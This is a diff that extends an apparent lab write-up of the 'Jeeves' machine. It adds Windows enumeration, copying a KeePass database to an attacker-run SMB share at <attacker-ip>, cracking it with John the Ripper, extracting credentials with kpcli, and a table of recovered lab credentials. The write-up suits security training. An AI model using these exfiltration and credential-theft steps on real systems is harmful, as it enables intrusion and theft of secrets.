@@ -102,6 +102,80 @@ This resulted in a shell as the `jeeves\kohsuke` user.
 
 ## 7. Post-Exploitation
 
+### Local Enumeration
+
+Privilege and system enumeration was performed:
+
+```
+whoami
+
+whoami /priv
+
+systeminfo
+```
+
+This revealed Windows 10 Pro Build 10586 with 10 Hotfixes installed and `SeImpersonatePrivilege` enabled. A KeePass database was discovered in the user's Documents directory:
+
+```
+C:\Users\kohsuke\Documents\CEH.kdbx
+
+```
+
+Command to find any KeePass file on Windows PowerShell (Not Used):
+
+```
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+```
+
+### File Exfiltration
+
+An SMB server was started on the attacker machine to exfiltrate the database:
+
+```
+impacket-smbserver TMP . -smb2support -username user -password pass
+```
+
+The KeePass file was copied from the Windows machine to the SMB server:
+
+```
+net use M: \\<attacker-ip>\TMP /user:user pass
+
+copy C:\Users\kohsuke\Documents\CEH.kdbx M:\
+
+net use M: /delete
+```
+
+### Credential Access
+
+The KeePass database was cracked offline using John the Ripper:
+
+```
+keepass2john CEH.kdbx > keepasshash.txt
+
+john --wordlist=/usr/share/wordlists/rockyou.txt keepasshash.txt
+```
+
+This revealed the database password `moonshine1`.
+
+A KeePass CLI tool `kpcli` was installed:
+
+```
+sudo apt install kpcli -y
+```
+
+Credentials and NTLM hashes were extracted using `kpcli`:
+
+```
+kpcli --kdb CEH.kdbx
+cd CEH/
+show -f 0
+show -f 1
+...
+show -f 7
+```
+
+This revealed multiple credentials (see Appendix). The NTLM hash associated with the local Administrator account was reused to authenticate via SMB, resulting in SYSTEM-level access.
+
 ---
 
 ## 8. Privilege Escalation
@@ -118,5 +192,22 @@ This resulted in a shell as the `jeeves\kohsuke` user.
 
 ## 11. Appendix
 
+### Recovered Credentials (Source: KeePass DB)
+
+| Title | Username | Credential Type | Usage |
+|-------|----------|-----------------|-------|
+| Backup stuff | ? | NTLM Hash | Used for Pass-The-Hash -> SYSTEM |
+| Bank of America | Michael321 | Password | Not used |
+| DC Recovery PW | administrator | Password | Not used |
+| EC-Council | hackerman123 | Password | Not used |
+| It’s a secret | admin | Password | Not used |
+| Keys to the kingdom | bob | Password | Not used |
+| Walmart[.]com | anonymous | Password | Not used |
+
+### Resources Used
+
 Groovy Script Reverse Shell -
 [https://gist.github.com/rootsecdev/273f22a747753e2b17a2fd19c248c4b7](https://gist.github.com/rootsecdev/273f22a747753e2b17a2fd19c248c4b7)
+
+Moving Files from Windows to Kali - 
+[https://duckwrites.medium.com/3-cool-ways-to-move-files-from-windows-to-kali-42973ec35279](https://duckwrites.medium.com/3-cool-ways-to-move-files-from-windows-to-kali-42973ec35279)
